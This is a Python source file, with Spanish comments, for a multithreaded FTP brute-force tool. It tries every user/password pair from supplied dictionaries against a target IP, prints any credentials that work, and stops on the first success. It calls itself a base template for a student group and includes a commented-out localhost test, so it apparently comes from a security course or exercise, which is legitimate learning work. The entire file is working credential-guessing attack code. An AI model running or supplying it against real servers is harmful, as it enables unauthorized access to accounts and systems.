import ftplib
import threading
import queue
import logging

class FTPBruteForcer:
    def __init__(self, ip_address, max_threads=5):
        self.ip_address = ip_address
        self.max_threads = max_threads
        self.queue = queue.Queue()
        self.found_credentials = []
        self.stop_event = threading.Event()

    def _worker(self):
        """Hilo de trabajo que procesa combinaciones (usuario, contraseña) desde la cola."""
        while not self.queue.empty() and not self.stop_event.is_set():
            try:
                user, password = self.queue.get(timeout=1)
                
                # TODO: Implementar la conexión por FTP usando ftplib
                ftp = ftplib.FTP()
                ftp.connect(self.ip_address, timeout=3)
                
                # Intentar iniciar sesión
                ftp.login(user=user, passwd=password)
                
                # Si la ejecución llega a esta línea, la autenticación fue exitosa
                self.found_credentials.append({'user': user, 'password': password})
                print(f"[!] ÉXITO: Credenciales encontradas -> {user}:{password}")
                
                ftp.quit()
                self.stop_event.set() # Detener los demás hilos al encontrar el acceso
                
            except ftplib.error_perm:
                # Código 530 - Autenticación fallida
                pass
            except Exception as e:
                logging.debug(f"Error de conexión: {e}")
            finally:
                self.queue.task_done()

    def load_dictionaries(self, users_list, passwords_list):
        """Llena la cola con todas las combinaciones posibles (Producto Cartesiano)."""
        for u in users_list:
            for p in passwords_list:
                self.queue.put((u, p))

    def run(self):
        """Inicia el pool de hilos y orquesta el ataque."""
        threads = []
        for _ in range(self.max_threads):
            t = threading.Thread(target=self._worker)
            t.start()
            threads.append(t)
            
        for t in threads:
            t.join()
            
        return self.found_credentials

if __name__ == "__main__":
    # Área de pruebas independiente para el Grupo 3
    print("Módulo de Fuerza Bruta FTP (Plantilla Base).")
    # inst = FTPBruteForcer("127.0.0.1")
    # inst.load_dictionaries(["admin", "root"], ["12345", "admin", "password"])
    # resultados = inst.run()
    # print(resultados)